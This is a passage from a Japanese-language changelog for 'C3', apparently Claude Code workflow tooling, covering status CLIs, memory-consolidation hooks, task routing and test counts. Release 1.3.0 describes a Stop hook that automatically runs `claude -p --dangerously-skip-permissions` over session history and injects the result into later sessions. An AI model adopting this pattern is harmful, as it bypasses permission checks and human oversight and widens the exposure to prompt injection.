- Tier 別累積（complexity × tier × alpha / beta / trials / 期待成功率）
- 直近 outcome 履歴（時系列降順、success/failure ラベル）
- 学習データ記録チャネルの説明（dev-workflow フェーズ E の最終承認時のみ発火する設計）

F-003 `c3 status` の CLI パターンを踏襲し、SQLite 直接参照で <100ms の応答。`locate_c3_db()` で c3.db を自動解決、不在時はエラー終了。期待成功率は Beta 分布の期待値 `alpha / (alpha + beta)` で計算。

### 修正

#### `.claude/docs/c3追加予定機能リスト.md` の F-005 ステータス訂正

実コードでは Phase 2-A / 2-B / 2-C が完了していたが、ドキュメントは「完了（MVP）」のまま。これを「完了（Phase 2）」に更新し、各フェーズの実装履歴と関連コミットハッシュを議論履歴に追記。スコープ外記述を「実装済み (b)(c)、残課題は (a) 親 Claude Agent ツール経由の model 切替（公式 API 上不可能）と効果計測」に書き直し。

### 内部

- 新規テスト追加 **7 件**:
  - `TestTierStatsCli::test_stats_empty_db_shows_collecting_message`
  - `TestTierStatsCli::test_stats_with_bandit_data`
  - `TestTierStatsCli::test_stats_recent_outcomes_displayed`
  - `TestTierStatsCli::test_stats_recent_limit_respected`
  - `TestTierStatsCli::test_stats_json_output_structure`
  - `TestTierStatsCli::test_stats_db_missing_returns_error`
  - `TestTierStatsCli::test_stats_threshold_reached_switches_mode`
- 既存テスト全件 pass: **838 passed / 3 skipped / 0 failed**
- escalation 発動回数の集計は専用テーブルがないため今回は表示なし（将来 `tier_escalations` テーブル追加時に拡張余地）

### スコープ外

- F-005 (a) 親 Claude Agent ツール経由の model 動的切替: 公式 API 上不可能（変更なし）
- outcome 記録チャネル拡張（直接指示作業からの記録）: 慎重設計が必要なため保留
- F-004 Phase 3: 別タスク

### 関連コミット

- 単一 commit でリリース予定

---

## [1.8.0] - 2026-05-10

### マイルストーン

F-004（MemoryConsolidation 集約フック）の **消費側を完成** させる minor リリース。v1.7.0 までは `consolidated_summary.md` を毎セッション LLM コストを払って生成しながら、誰も読まない write-only ファイルになっていた。本リリースで Ruflo の MemoryConsolidation 設計意図どおり「auto-context-injection（次セッションで Claude が自動的にコンテキストとして読み込む）」を実装した。LLM 要約セクションだけを抽出した小ファイル `.claude/memory/llm_summary.md`（~3.6KB / ~900 tokens）を CLAUDE.md から @include することで、毎セッション開始時に直近 7 日のドメイン知見が自動注入される。

### 設計意図の出典

`.claude/docs/ruflo_research_result.md` セクション 2.5「C3 への適用判断」より:

> **MemoryConsolidation 相当の集約フック（最有力）**
> - 日次 `.tmp` を SessionStop フックでマージし、**信頼度スコア付きで `auto-memory/MEMORY.md` に統合**
> - embedding 不要で導入容易

C3 ではプロジェクトレベルでの常時注入として `.claude/CLAUDE.md` の @include 機構を採用（Ruflo の MEMORY.md 自動注入の C3 版）。

### 新機能

#### LLM 要約の auto-context-injection

`.claude/hooks/consolidate_memory.py` に消費側を実装:

- **新規定数**: `LLM_SUMMARY_PATH`（`.claude/memory/llm_summary.md`）/ `LLM_SUMMARY_PLACEHOLDER`
- **新規ヘルパー**:
  - `_ensure_llm_summary_placeholder()`: 初回 clone 後・LLM 未生成時に空のプレースホルダを書き出す（CLAUDE.md @include の前提を確保）
  - `_write_llm_summary_extract()`: `consolidated_summary.md` から `## LLM 要約` セクションだけを正規表現で抽出し、別ファイルにアトミック書き込み（tempfile + os.replace）
- **`_full_sync_main()` 改修**: 同期処理内でプレースホルダ確保（初回 clone 後の最初の Stop で作成される）
- **`_llm_only_main()` 改修**: LLM 要約完了後に `_write_llm_summary_extract()` を呼んで小ファイルに反映

`.claude/CLAUDE.md` の C3 Managed セクションに `@memory/llm_summary.md` を追加。`@rules/promoted/index.md` と同じ機構で毎セッション開始時に自動注入される。

#### サイズ最適化の判断

`consolidated_summary.md` 全体（~19KB / ~5000 tokens）を @include せず、LLM 要約セクションだけ（~3.6KB / ~900 tokens）に絞った理由:
- MVP セクション（行マージ）: ~10〜14KB の生データ。LLM 要約に既に吸収済みで重複（注入価値低）
- 昇格候補セクション: ~1KB。`rules/promoted/index.md` で既にカバー済み
- LLM 要約: ~4KB の distill 済最終形（注入価値高）

5x 削減でコンテキスト効率を保ちつつ、Claude が複数セッションを跨いだドメイン知見を持って次セッションを始められる。

### 内部

- 新規テスト追加 **8 件**（4 クラス）:
  - `TestLLMSummaryExtract` 4 件: 抽出ロジック / source 不在 / セクション不在 / 既存上書き
  - `TestLLMSummaryPlaceholder` 2 件: 不在時作成 / 既存非上書き
  - `TestFullSyncMainEnsuresPlaceholder` 1 件: `_full_sync_main` がプレースホルダ確保を呼ぶこと
  - `TestLLMOnlyMainExtractsLLMSummary` 1 件: `_llm_only_main` が抽出を呼ぶこと
- 既存テスト全件 pass: **831 passed / 3 skipped / 0 failed**
- `.claude/memory/llm_summary.md` は `.gitignore` に追加（machine-local 動的生成）

### 関連コミット

- 単一 commit でリリース予定

---

## [1.7.0] - 2026-05-10

### マイルストーン

session.tmp の引き継ぎバックログ更新メカニズムを再設計しつつ、Stop hook の体感ブロック時間を **5〜15 秒 → 76ms** に短縮する性能改善を入れた minor リリース。バックログ更新はセッション開始時の git log 照合（init-session Step 1.5）と dev-workflow フェーズ E のコミット直前確認の二重ネットで担保。Stop hook の LLM 要約はバックグラウンド子プロセスにデタッチ起動し、Windows でのコンソールウィンドウ可視化問題（`DETACHED_PROCESS` から `CREATE_NO_WINDOW` への切替）も同時に解消した。

### 新機能

#### 引き継ぎバックログ照合メカニズム

`## 残タスク` セクションには「dev-workflow が更新するフェーズ項目（A）」と「過去セッションから引き継いだ高レベルバックログ（B）」が混在している。種別 B には更新トリガーが存在せず、リリースで完了したタスクが `[ ]` のまま放置される問題があった。これを以下の二重ネットで解決:

- **`.claude/skills/init-session/SKILL.md`**: Step 1.5 を新設し、前回セッション以降の `git log --since` と残タスクをキーワード照合（`F-XXX` / `Phase X` / 機能名）。完了している可能性のあるタスクを Step 3 サマリで提示し、AskUserQuestion でユーザー承認時のみ `[x]` 化する。自動更新は誤検知防止のため行わない
- **`.claude/skills/dev-workflow/SKILL.md`**: フェーズ E（指摘なし時の承認 / 全許容完了）のコミット提案直前に共通ステップ「引き継ぎバックログの照合」を呼び出すよう変更。当セッションの作業内容と関連しうるバックログ項目を検索し、AskUserQuestion で更新確認する
- **`.claude/docs/taxonomy.md`**: `memory/` セクションの「ユーザーは原則として手動編集しない」記述を Hook と LLM の責務分担として明確化（Hook が骨格、LLM が内容更新）

### 性能改善

#### Stop hook の LLM 要約をバックグラウンドデタッチ実行

`.claude/hooks/consolidate_memory.py` の `claude CLI subprocess` 呼び出し（最大 60 秒タイムアウト）が Stop hook 内で同期実行されており、ユーザーの次プロンプト入力を 3〜15 秒間ブロックしていた。実装を以下に変更:

- `main()` を 2 モードに分割: 通常モード `_full_sync_main()` は同期処理（MVP 集約・promotion ログ・archive）のみ完了させて即 exit 0、LLM 要約は `--llm-only` 子プロセスとしてデタッチ起動
- 子プロセス側 `_llm_only_main()` は `.claude/state/consolidate_llm.lock` で多重起動を防ぎながら LLM 要約を生成し、`consolidated_summary.md` に追記
- 計測結果: Stop hook ブロック時間 **76 ms**（修正前 3〜15 秒）。LLM 要約は終始バックグラウンドで完了

### 修正

#### Windows でのコンソールウィンドウ可視化問題

デタッチ子プロセスが `DETACHED_PROCESS` フラグで起動されると、その子が `claude.exe`（console application）を呼ぶ際に Windows が新しいコンソールを自動割り当てし、ユーザーに「真っ黒な別ウィンドウ」が見えてしまう問題を修正:

- `_spawn_detached_llm()`: `DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP` → `CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP` に変更（前者は `CREATE_NO_WINDOW` と排他）
- `build_llm_summary_section()`: claude CLI subprocess に Windows 限定で `creationflags=CREATE_NO_WINDOW` を追加（保険的二重対策）
- macOS / Linux は `start_new_session=True` 分岐を維持。クロスプラットフォーム動作不変

### 内部

- 新規テスト追加 **23 件**:
  - `tests/skills/test_session_backlog_reconciliation.py` 8 件（init-session / dev-workflow / taxonomy 整合性検証）
  - `tests/hooks/test_consolidate_memory.py` 15 件（`_full_sync_main` / `_spawn_detached_llm` / lock / `_llm_only_main` / `_parse_today_arg` / `main` dispatch / Windows・Unix 両プラットフォーム subprocess flags）
- 既存テスト全件 pass: **823 passed / 3 skipped / 0 failed**
- `.claude/state/consolidate_llm.lock` は既存の `.gitignore` `.claude/state/*` ルールでカバー済み（追加除外不要）

### 関連コミット

- 単一 commit でリリース予定

---

## [1.5.2] - 2026-05-09

### マイルストーン

`planner.md` の **PO writes 衝突回避ルール** を実装の挙動に合わせて修正する patch リリース。c3_pip_test 環境で発生した昇格候補パターン `po_pre_setup_main_js_stub_avoidance` を契機に、`src/parallel_orchestra/manifest.py:463 _check_writes_conflicts` が **静的チェックで `depends_on` / `concurrency_group` を考慮しない**事実を確認。1.5.1 までの planner.md ルール 8 / 10 が「writes 重複は (a) まとめる / (b) `depends_on` で順序付け / (c) `concurrency_group` で同時実行を 1 に」と案内していたが、(b)(c) は **実際には dry-run を通らない** ため誤った指針だった。

### 修正

#### `.claude/agents/planner.md` のルール再整理

- **ルール 8 を書き換え**: 同一ファイルへの書き込みは (a) タスクをまとめる / (b) 1 タスク専属にする の 2 つに限られる。`depends_on` / `concurrency_group` では `_check_writes_conflicts` の静的検出を回避できない事実を明記。先行タスクで stub / placeholder を作って後発タスクで上書きする設計は **不可**（dry-run が落ちる）と明示。
- **ルール 9 を新設**: 統合ファイル（`main.js` のようなエントリポイント）は最後の wave 専属にする。先行 wave は各機能ファイル（`calc.js` / `currency.js` 等）のみを書き、最終 wave がそれらを import して統合する。
- **ルール 10 / 11 を整理**: タイムアウト 15 分制約を 11→10 に繰り上げ、`depends_on: []` 禁止を 9→11 に繰り下げ。連番に揃えた。
- **旧ルール 10 を削除**: 新ルール 8 と内容が完全重複していたため。
- `Tools & Constraints` の参照範囲を「ルール 1〜8」から「ルール 1〜11」に拡張。

### 背景

`src/parallel_orchestra/manifest.py:463 _check_writes_conflicts` の実装は単純に「同一パスを 2 タスク以上が `writes` に持つ」かだけを判定する設計（`depends_on` / `concurrency_group` を考慮しない）。これは衝突を **静的に検出して dry-run で落とす** ことで、並列実行時の破壊的競合を未然に防ぐためのガード。1.5.1 までのルールは実装と整合していなかった。

### 内部

- 既存テスト全件 pass: **770 passed / 3 skipped / 0 failed**（変更はドキュメントのみ、テスト追加なし）。

### 関連コミット

- 単一 commit でリリース予定

## [1.5.1] - 2026-05-09

### マイルストーン

`c3 po run-wave` の **非 TTY 環境（Claude Code 等のログ集約 UI 経由）** での進捗表示を改善する patch リリース。1.5.0 までは task ごとに 30 秒間隔で `[task-id] thinking... 73s` のような行が際限なく増え、6 並列だと 1 分で 12 行以上、Claude Code 側で `+63 lines` のように省略されて全タスクの状況が読み取れなかった。1.5.1 ではタスクごとの逐次ログを廃止し、wave 全体を 1 行にまとめた **サマリ行** を 30 秒間隔で 1 行ずつ出すよう変更した。

### 改善

#### 非 TTY 時のサマリ行表示

- `runner.py` に `_summary_loop` / `_format_summary_line` / `_resolve_summary_interval` を新設。30 秒ごとに wave 全体の状況を 1 行で stderr に出す:
  ```
  [summary] 6 tasks: 4 running (be-calc:120s, be-currency:90s, fe-base:75s, +1 more), 1 starting, 1 completed
  ```
- `_progress_watchdog` の非 TTY 分岐から `[task-id] starting up... / running... / thinking... Xs` の per-task print を削除（dashboard.update による state 管理は維持）。
- `_Dashboard.update()` を `enabled=False` でも state を保持するよう変更（summary loop が `snapshot_states()` を読むため）。render 通知 (`_dirty_event`) は引き続き enabled で gate。
- TTY 環境（既存の ANSI in-place dashboard）の挙動は変更なし。

### 設定

- env `C3_PO_SUMMARY_INTERVAL_SEC` で間隔を上書き可能（無効値・0 以下はデフォルト 30 秒に戻す）。

### 内部

- 新規テスト追加: `tests/parallel_orchestra/test_summary_loop.py` に 12 ケース（フォーマット 4 / 環境変数 4 / loop スレッド 3 / dashboard state 保持 1）。
- 全体: **770 passed / 3 skipped / 0 failed**（前回 758 + 12）。

### 関連コミット

- 単一 commit でリリース予定

## [1.5.0] - 2026-05-09

### マイルストーン

第 9 波として F-003（PO 並列処理の状況可視化）の Phase 2 を完成。Phase 1 で実装済みの `po_status` テーブル + heartbeat スレッド + `po-status` skill に対して、対話なしの即時実行 CLI **`c3 status`** を追加した。これにより cron / watch / シェルパイプから機械可読出力（`--json`）を経由した監視自動化が可能になり、`po-status` skill の DuckDB ATTACH 5〜10 秒遅延を解消した（SQLite 直接参照で <1 秒応答）。

### 追加（第 9 波）

#### F-003 Phase 2: `c3 status` ダッシュボード CLI

- `src/c3/cli_status.py` を新規作成（約 395 行）。引数なしで最新 session の active worktree を表形式表示。
- フラグ: `--session ID` / `--all` / `--state {starting,running,completed,failed,waiting}` / `--worktree GLOB` / `--watch` / `--interval SEC` / `--stale-threshold SEC` / `--no-stale` / `--limit N` / `--json` / `--verbose`。
- 種別ごとに ANSI 色: 緑=completed / 黄=running+stale / 赤=failed / シアン=running / グレー=starting/waiting。
- stale 検出: `last_heartbeat` が threshold 秒（デフォルト 90）超の running 行を `[STALE]` でハイライト。
- 失敗詳細: failed 行に `po_results.error_message` を結合（デフォルト 80 文字、`--verbose` で 500 文字）。
- `--watch` モード: ANSI 画面クリア + 30 秒間隔再描画。`KeyboardInterrupt` で exit 0。
- 出力: 表形式デフォルト、`--json` で `json.dumps(..., ensure_ascii=False, indent=2)`。
- 外部依存ゼロ: `rich` / `tabulate` を追加せず、`cli_doctor.py::_format` 同様の自前 ANSI 実装。

#### `fetch_po_results` の新設

- `src/parallel_orchestra/c3_db.py` に `fetch_po_results(session_id, *, db_path, status, limit)` を追加。
- 戻り値キー: session_id / worktree_id / task_id / status / started_at / completed_at / output_summary / error_message。
- `PRAGMA busy_timeout=5000` を冪等適用、エラー時は空リスト。

#### `src/c3/_terminal.py` 共通モジュール新設

- `supports_color()` / `strip_ansi()` / `sanitize_terminal_text()` の 3 関数を提供。
- `cli_doctor.py` の `_supports_color` をコピーで持っていた DRY 違反を解消。今後の `cli_*.py` でも再利用可能。

### 設計判断

- **テーブル表示は外部依存ゼロで自前実装**: C3 dependencies は最小（PyYAML / duckdb のみ）を維持。`cli_doctor.py::_format()` の前例があり 80 行未満で実装可能。`rich` / `tabulate` 依存追加は摩擦・体積負債が見合わない。
- **--watch モードは MVP に含める**: heartbeat 自体が 30 秒間隔なのでそれ未満は無駄。`time.sleep` + ANSI 画面クリア + `KeyboardInterrupt` で 20 行内。
- **デフォルトは最新 session のみ表示**: 引数なしで「いま何が動いてるか」が即わかる UX を優先。`--all` で全 session 横断。
- **失敗詳細は同じコマンドで取得**: `fetch_po_results` を新設して Python 側で結合。failed 調査時の DB 再アクセスを避ける。
- **CLI と skill の役割分離**: CLI は速度重視・自動化向け、skill は対話・複雑分析向けで併存。

### セキュリティ

- DB 由来テキスト（`current_step` / `error_message`）を端末に出す前に `sanitize_terminal_text` で ANSI / 制御文字をサニタイズ（`\x00-\x08\x0b\x0c\x0e-\x1f\x7f` を除去）[SR-INJ-003 対応]。
- `--interval` / `--stale-threshold` に下限クランプ（busy loop / 全 stale 誤検出を防止）[SR-V-001 対応]。
- SQL は全てプレースホルダ経由（SQL インジェクション対策）。

### 内部

- 新規テスト追加: `tests/test_cli_status.py` 8 ケース + `tests/parallel_orchestra/test_po_status_visibility.py` に `TestFetchPoResults` 3 ケース、計 11 ケース。
- DB 読み出し全パス（`fetch_po_results` / `_get_latest_session_id` / `_list_recent_sessions`）に `PRAGMA busy_timeout=5000` を設定（F-002 Phase 2-B 既知パターンの再発防止）。
- `_attach_error_messages` を failed 行のみに書き込むよう責務明確化（JSON 出力でキーの有無により failed/非 failed を判別可能に）。
- 全体: **758 passed / 3 skipped / 0 failed**（前回 747 + 11）。

### 注意（既存利用先への影響）

- `c3 status` は新サブコマンド追加のみで、既存 `c3 init` / `c3 update` / `c3 list` / `c3 doctor` / `c3 po` には影響なし。
- 既存 `po-status` skill との併存。skill / CLI どちらからも同じ DB を参照する read-only アクセスのため衝突しない（busy_timeout=5000 で対策済み）。
- `parallel_orchestra/__init__.py` の version は `importlib.metadata` で host package version を参照する仕組みのため、`pip install -e .` を実行すれば 1.5.0 に追随する。v1.4.0 リリース時に `pip install -e .` 漏れがあったため、リリース後の再インストールをチェックリストに追加。

### 関連コミット

- `cdc840e` feat(cli): F-003 Phase 2 c3 status ダッシュボード CLI を追加

## [1.4.0] - 2026-05-09

### マイルストーン

第 8 波として F-010（タスク種別 → エージェント編成 skill）の Phase 2 を完成。Phase 1 で実装済みの `task-routing` skill を **`/start` フローに自動統合** し、bug-fix / refactor / security-audit / docs といった軽量タスクで dev-workflow フェーズ A〜E のフルパスを回避できる経路を提供した。同時に dev-workflow フェーズ A-1（目的選択）と task-routing 5 種別の二重質問を解消し、UX 負債を 1 つ削減した。

### 追加（第 8 波）

#### F-010 Phase 2: task-routing skill を /start フローに自動統合

- `start/SKILL.md` に **Step 0.5「タスク種別の確認」** を新設。Step 0（レポート整理）と Step 1（開始地点選択）の間に挿入され、`/start` 起動時に必ずタスク種別が確定される。
- 前回 tmp に `TASK_TYPE` があれば「前回と同じ / 別の種別」の 2 択ショートカットで質問数を最小化。なければ Skill ツールで `task-routing` を `args="from_start=true"` 付きで呼び出し。
- Step 1（開始地点選択）を **種別ごとに選択肢を絞る** 分岐に改修。feature 4 択 / bug-fix 1〜2 択（既存 plan-report 有無で動的）/ refactor 2 択 / security-audit / docs は確認のみの 1 択。
- Step 2 を **種別 × 開始地点 → フェーズ遷移** マッピング表に拡張。bug-fix → systematic-debugger 直結 / docs → doc-writer 単独 / security-audit → 並列レビュアー / refactor → wave-execution の各経路を明文化。
- `task-routing/SKILL.md` に **動作モード分岐** を追加。`args` に `from_start=true` が含まれていれば Step 1 のみ実行して `/start` に種別を返却し、Step 2〜4 はスキップ（再帰呼び出し回避）。単独利用（`/task-routing`）は Step 1〜4 すべて実行する後方互換を維持。
- `dev-workflow/SKILL.md` フェーズ A 冒頭で TASK_TYPE を読み取り、**A-1「目的選択」を削除**して A-2〜A-5 を A-1〜A-4 へ繰り上げ。これにより task-routing 5 種別との二重質問が解消。`/develop` 直接呼び出しなど Step 0.5 を経由しない場合のフォールバックも実装。
- `dev-workflow/SKILL.md` A-4（旧 A-5）の requirements-report 生成手順に `task_type:` フロントマターを追加し、後段の architect / planner / interviewer に種別を伝達。
- `init-session/SKILL.md` Step 1 で前回 TASK_TYPE を抽出して Step 3 サマリに含めるよう拡張。Step 5「ワークフローで始める」に「`/start` 内で task-routing が自動実行されるため個別呼び出し不要」と注記追加。
- `session_utils.py::create_session_template` のテンプレートに `TASK_TYPE: \n` 行を追加（SESSION 直後）。tmp 冒頭順序非依存パーサのため既存 hook（stop / restore_session / consolidate_memory）に影響なし。

### 設計判断

- **Skill ツール呼び出しのフラグ伝達は env ではなく args**: 当初 `C3_TASK_ROUTING_FROM_START=1` の env 経由を想定したが、Skill ツールは LLM 内のコンテキスト読み込みで子プロセス起動を伴わないため env が伝わらない。code-reviewer の H-1 指摘で発見し、Skill `args="from_start=true"` 方式に切り替え。
- **TASK_TYPE 値のホワイトリスト検証**: 前回 tmp から抽出した `TASK_TYPE` が `feature / bug-fix / refactor / security-audit / docs` のいずれでもない場合は `prev_type=None` として task-routing に進む（プロンプト汚染対策 [SR-V-001]）。
- **dev-workflow A-1 削除の影響緩和**: requirements-report のフロントマターに `task_type:` を必ず含めることで、後段の architect / planner / interviewer に種別を伝達。`/develop` 直接呼び出し時は dev-workflow A 冒頭で task-routing を `args="from_start=true"` 付きで呼んでフォールバック。

### 注意（既存利用先への影響）

- `/start` 起動時に Step 0.5「タスク種別の確認」が追加されるため、既存ユーザーには質問が 1 つ増える。`feature` を最初の選択肢に置き「feature を選ぶと従来の /start と同じフローに進む」と明示することで UX 劣化を最小化。
- セッション tmp の冒頭に `TASK_TYPE: \n` 行が追加される。既存 hook はこの行を順序依存でパースしないため影響なし。
- `/task-routing` 単独利用は完全な後方互換を維持。既存ユーザーの動線に影響なし。

### 内部

- 新規テスト追加: `test_session_utils.py::TestCreateSessionTemplate` に `test_contains_task_type_line` / `test_task_type_line_position_after_session` の 2 ケース。
- 全体: **747 passed / 3 skipped / 0 failed**（前回 745 + 2）。

### 関連コミット

- `b745c31` feat(skills): F-010 Phase 2 task-routing を /start に自動統合

## [1.3.0] - 2026-05-09

### マイルストーン

第 7 波として F-004（MemoryConsolidation 集約フック）の Phase 2 を A/B/C すべて完成。1.2.x までは MVP の「過去 7 日分の `## うまくいったアプローチ` / `## 試みたが失敗したアプローチ` を単純行マージして `consolidated_summary.md` に書き出すだけ」だったが、本リリースで **archive 自動整理 / 半自動 promotion 候補ログ / claude --headless による LLM 要約** の 3 機能を追加した。session ファイルの永久蓄積、見落とされがちな patterns.json の昇格候補、人間が読みづらい単純マージ、という MVP の 3 つのギャップが解消され、C3 の自己学習サイクルが完結した。

### 追加（第 7 波）

#### F-004 Phase 2-A: archive 機能で session.tmp を自動整理

- `consolidate_memory.py` に `archive_old_sessions()` を追加。21 日 (`DEFAULT_WINDOW_DAYS * 3`) 超の `YYYYMMDD.tmp` を `.claude/memory/archive/` に `shutil.move`。同名衝突時は `YYYYMMDD-{N}.tmp` で別名生成 (N=1..1000)。
- `_resolve_archive_ttl()` で env `C3_CONSOLIDATE_ARCHIVE_TTL_DAYS` を安全解決（不正値・0 以下はデフォルトに戻し、全 session 誤 archive を防止 [SR-V-001]）。
- `main()` に独立 try/except で archive ステップを追加。MVP マージ失敗と archive 失敗を分離し片方が他方を巻き込まない。
- 配布除外: `.gitignore` / `_excludes.py` / `hatch_build.py` の 3 箇所同期更新で `memory/archive/*` 追加、`memory/archive/.gitkeep` のみ残す。

#### F-004 Phase 2-B: 半自動 promotion 候補ログ

- `_load_patterns_readonly()` で `patterns.json` を読み込み専用アクセス（stop.py との書き込み競合を構造的に回避）。
- `build_promotion_candidates_section()` + `write_promotion_candidates_log()` で `promotion_candidate=true` AND NOT `promoted` のパターンを `.claude/memory/promotion-candidates.md` にアトミック書き込み（`tempfile.mkstemp` + `os.replace`）。Markdown 表 + 詳細セクションで一覧化、候補 0 件でも「候補なし」表記で前回出力を上書き。
- `_truncate_for_table()` で改行除去 + `|` / backtick エスケープ + 末尾切り詰め [SR-INJ-003]。`_extract_candidate_fields()` で表/詳細セクションの DRY 化。
- `consolidated_summary.md` 末尾にも「## 昇格候補」サマリセクションを追加。詳細は別ファイルに分離して肥大化を抑制。
- 配布除外: `promotion-candidates.md` も 3 箇所同期で除外。

#### F-004 Phase 2-C: claude --headless で LLM 要約

- `build_llm_summary_section()` で `claude -p --dangerously-skip-permissions` を subprocess 実行し、過去 7 日のセッション履歴を 5〜10 行の Markdown 箇条書きに要約。
- **プロンプトインジェクション対策** [SR-AI-001]: セッションデータを `<session_data>` / `<successful_approaches>` / `<failed_approaches>` XML タグで囲み、LLM 命令文と明確に分離。
- **再帰呼び出し抑止**: env `C3_CONSOLIDATE_LLM_DEPTH` を depth+1 で子に伝播し、>=1 で即スキップ。Stop hook → claude → Stop hook の循環を 1 サイクルで停止。timeout 60 秒で最悪ケース保護。
- **サイズ制御**: 入力 6000 文字（両セクション均等トリム）/ 出力 4000 文字（超過時は `_…（要約が長すぎたため切り詰めました）_` マーカー）。
- **フェイルセーフ多段**: claude CLI 不在 (`shutil.which` None) / TimeoutExpired / 非ゼロ returncode / 空応答 / `"Error:"` 始まり、いずれも警告ログのみで `None` を返してセクション省略。
- `write_summary()` に `enable_llm: bool = False` 引数追加（後方互換）。MVP セクション → LLM 要約 → 昇格候補サマリの順で組み立て。

### 注意（既存利用先への影響）

- `.claude/memory/archive/` ディレクトリが Stop hook 実行時に自動生成される。`.gitignore` / wheel から除外済みのため利用先プロジェクトに git 汚染は出ないが、ディスク使用量は徐々に増える（21 日超のセッション履歴を保存し続けるため）。気になる場合は `archive/` を手動削除可能。
- `.claude/memory/promotion-candidates.md` が新規生成される。同様に配布除外済み。
- claude CLI が PATH にあれば LLM 要約が走る。env `CLAUDE_BIN=/path/to/claude` で別パス指定可。CLI 不在環境（CI 等）では LLM セクションは省略され、他のセクションのみ生成される。
- `consolidated_summary.md` のフォーマットが拡張: MVP セクション後に「## LLM 要約」「## 昇格候補」が追加される（既存セクションの位置・内容は変更なし）。

### 内部

- 新規テスト追加: 17 ケース（Phase 2-A: 5 / Phase 2-B: 5 / Phase 2-C: 7）。
- 全体: **745 passed / 3 skipped / 0 failed**（前回 728 + 17）。

### 関連コミット

- `cab1650` feat(memory): F-004 Phase 2-A archive 機能で session.tmp を自動整理
- `411eee7` feat(memory): F-004 Phase 2-B 半自動 promotion 候補ログを実装
- `9ecc2da` feat(memory): F-004 Phase 2-C claude --headless で LLM 要約セクションを生成

## [1.2.0] - 2026-05-09

### マイルストーン

第 6 波として F-002（PO 集約レイヤの SQLite 化）の Phase 2 を A/B/C すべて完成。1.1.x までは「親 Claude の `runner.py` が完了後にまとめて INSERT」する Phase 1 の集約だったが、本リリースで **worktree 内の子 Claude プロセスから直接 `.claude/state/c3.db` に書き込める配管** を整備した。子 Claude が自身の進捗を能動的に報告できるようになり、PO の状態可視化（F-003）と review_decisions（F-001）／tier_outcome（F-005）の収集が worktree 内 dev-workflow からも機能するようになった。

### 追加（第 6 波）

#### F-002 Phase 2-A: 環境変数渡し + locate_c3_db env-aware 化

- `src/parallel_orchestra/c3_db.py`: `locate_c3_db()` を env-aware 化。`C3_PO_DB_PATH` 環境変数があればそれを優先し、無効なパスなら警告ログを出して既存の親方向探索に fall-through。後方互換 100%。
- 全 5 箇所の write 関数（`record_task_results` / `insert_review_decision` / `upsert_po_status` / `update_tier_params` / `record_tier_recent_outcome`）に `PRAGMA busy_timeout=5000` を冪等適用。並列書き込み増加に備える。
- `READ_ONLY_WORKTREE_ID = "(read-only)"` / `_BUSY_TIMEOUT_MS = 5000` をマジック値から定数化。
- `src/parallel_orchestra/runner.py`: `_execute_task` / `_execute_with_retry` に `po_session_id: str | None = None` 引数を追加（後方互換）。`run_manifest` の `execute_fn` から `_po_session_id` を伝搬し、subprocess 起動時の env dict に `C3_PO_DB_PATH` / `C3_PO_SESSION_ID` / `C3_PO_TASK_ID` / `C3_PO_WORKTREE_ID` の 4 変数を注入（write task / read_only 両モード対応）。
- 新規テスト: `tests/parallel_orchestra/test_po_worktree_writes.py`（5 ケース）+ `tests/parallel_orchestra/test_po_results_recording.py` に locate_c3_db env-aware の 3 ケース追加。

#### F-002 Phase 2-B: po_heartbeat CLI + subagent_log fold-in + terminal state 保護

- 新規 `.claude/hooks/po_heartbeat.py`（~98 行）: 子 Claude が任意のタイミングで状態を UPSERT できる薄い CLI。引数は `--state running|starting|completed|failed` / `--step "<text>"` / `--progress 0-100`。環境変数 `C3_PO_SESSION_ID` / `C3_PO_WORKTREE_ID` から自動取得し、欠落時はフェイルセーフで exit 0。
- `.claude/hooks/subagent_log.py`: `_maybe_upsert_po_status()` を追加。`C3_PO_WORKTREE_ID` + `C3_PO_SESSION_ID` 両方が設定されているときのみ動作し、SubagentStart で `state="running"` / SubagentStop の status を見て `"completed"` / `"failed"` を UPSERT。親 Claude セッション（環境変数なし）では完全 no-op で副作用ゼロ。`current_step` は `_MAX_CURRENT_STEP_LEN=200` 文字で切り詰め（DB 容量保護）。
- `c3_db.upsert_po_status` SQL に terminal state 保護 CASE を追加（`completed` / `failed` の行は逆行上書きを阻止、current_step / progress_pct / last_heartbeat は常に最新値で更新）。親 heartbeat と worktree 内子 heartbeat の競合で完了状態が running に逆行する事故を防ぐ。
- read 系 4 関数（`fetch_po_status` / `fetch_review_decisions` / `read_tier_params` / `read_tier_failure_rate`）にも `PRAGMA busy_timeout=5000` を追加（読み出し競合の緩和）。
- 新規テスト: `test_po_worktree_writes.py` に 8 ケース追加（PoHeartbeatCli 4 + SubagentLogPoStatusFoldIn 4）。`test_po_status_visibility.py` に terminal state 保護の 4 ケース追加。

#### F-002 Phase 2-C: ドキュメント + 動作確認

- 新規 `.claude/docs/po-worktree-writes.md`（172 行）: 環境変数仕様 / locate_c3_db 解決順 / po_heartbeat 使い方 / subagent_log 挙動 / terminal state 保護 / 並列耐性 / hook 別 worktree 内動作表 / 関連リスクをまとめた人間向けドキュメント。
- 動作確認結果: `record_review_decision.py` / `review_hint_inject.py` は env-aware locate_c3_db で worktree 内からも親リポ c3.db に書ける（追加修正不要）。`record_tier_outcome.py` は `tier_selection.json` が親 Claude セッション専用設計のため worktree 内では no-op（意図通り）。

### 注意（既存利用先への影響）

- `_execute_task` / `_execute_with_retry` のシグネチャに `po_session_id` キーワード引数が追加されたが、既存呼び出し（`po_session_id` 省略）はクラッシュしない後方互換設計。
- `upsert_po_status` の SQL 改修で terminal state（completed / failed）が保護されるようになった。これは Phase 1 までの「常に最新値で上書き」挙動からの変更点。完了状態を再 running に戻すユースケースがあれば事前に DB 行を削除する必要がある（通常そういうユースケースは想定されない）。
- 環境変数 `C3_PO_*` プレフィックスを子プロセスに注入するようになった。子から spawn された孫プロセスにも継承されるため、ネスト PO は現状非対応（孫が古い session_id を見る可能性あり）。

### 内部

- 新規テスト追加: 16 ケース（Phase 2-A: 8、Phase 2-B: 8、Phase 2-C: 0）。
- 全体: 725 passed / 3 skipped / 0 failed。

### 関連コミット

- `1ea6b7f` feat(po): F-002 Phase 2-A worktree 内からの直接 SQLite 書き込み配管
- `c37e576` feat(po): F-002 Phase 2-B worktree 内 heartbeat 入口
- `8287894` docs(po): F-002 Phase 2-C ドキュメント追加

## [1.1.1] - 2026-05-09

### 修正

